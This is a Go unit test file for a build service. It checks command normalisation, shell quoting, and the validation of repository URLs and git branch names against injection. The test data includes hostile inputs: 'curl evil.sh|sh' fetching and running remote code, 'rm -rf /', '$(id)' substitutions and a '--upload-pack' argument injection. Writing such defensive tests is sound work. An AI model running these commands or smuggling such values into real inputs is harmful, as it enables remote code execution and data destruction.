package services

import (
	"os/exec"
	"runtime"
	"testing"
)

func TestNormalizeBuildCommand(t *testing.T) {
	cases := []struct {
		in   string
		want string
	}{
		{"", "npm run build"},
		{"build", "npm run build"},
		{"  build  ", "npm run build"},
		{"npm run build", "npm run build"},
		{"yarn build", "yarn build"},
		{"pnpm build", "pnpm build"},
		{"npx tsc && vite build", "npx tsc && vite build"},
	}
	for _, c := range cases {
		if got := NormalizeBuildCommand(c.in); got != c.want {
			t.Errorf("NormalizeBuildCommand(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestShellQuote(t *testing.T) {
	cases := []struct {
		in   string
		want string
	}{
		{"simple", "'simple'"},
		{"with space", "'with space'"},
		{"$(whoami)", "'$(whoami)'"},
		{"`id`", "'`id`'"},
	}
	for _, c := range cases {
		if got := shellQuote(c.in); got != c.want {
			t.Errorf("shellQuote(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestIsValidRepoURL(t *testing.T) {
	valid := []string{
		"https://github.com/user/repo",
		"https://github.com/user/repo.git",
		"git@github.com:user/repo.git",
		"git://github.com/user/repo.git",
	}
	for _, u := range valid {
		if !isValidRepoURL(u) {
			t.Errorf("isValidRepoURL(%q) = false, want true", u)
		}
	}

	// The URL is interpolated into `sh -c` — metacharacters must be rejected.
	invalid := []string{
		"https://github.com/user/repo.git; curl evil.sh|sh",
		"https://github.com/user/$(id).git",
		"https://github.com/user/repo`id`",
		"https://github.com/user/repo && rm -rf /",
		"https://github.com/user/repo|cat",
		"http://x/../y",
		"",
	}
	for _, u := range invalid {
		if isValidRepoURL(u) {
			t.Errorf("isValidRepoURL(%q) = true, want false", u)
		}
	}
}

func TestIsValidGitRef(t *testing.T) {
	valid := []string{"main", "master", "feature/x", "v1.2.3", "release-2024"}
	for _, r := range valid {
		if !isValidGitRef(r) {
			t.Errorf("isValidGitRef(%q) = false, want true", r)
		}
	}

	// Branch is passed to `git clone --branch <ref>`.
	invalid := []string{
		"main; curl evil.sh|sh",
		"main && rm -rf /",
		"$(id)",
		"`id`",
		"--upload-pack=evil",
		"a..b",
		"",
		"has space",
	}
	for _, r := range invalid {
		if isValidGitRef(r) {
			t.Errorf("isValidGitRef(%q) = true, want false", r)
		}
	}
}

// An injected payload must survive quoting as a literal value, never execute.
// Requires a POSIX shell, so it only runs on the Linux targets this binary ships to.
func TestShellQuoteNeutralizesInjection(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("requires /bin/sh; project targets Linux")
	}
	evil := "x'; curl evil.sh | sh; y='"
	out, err := exec.Command("/bin/sh", "-c", "printf %s "+shellQuote(evil)).Output()
	if err != nil {
		t.Fatalf("sh failed: %v", err)
	}
	if string(out) != evil {
		t.Fatalf("shellQuote did not neutralize payload: got %q want %q", out, evil)
	}
}
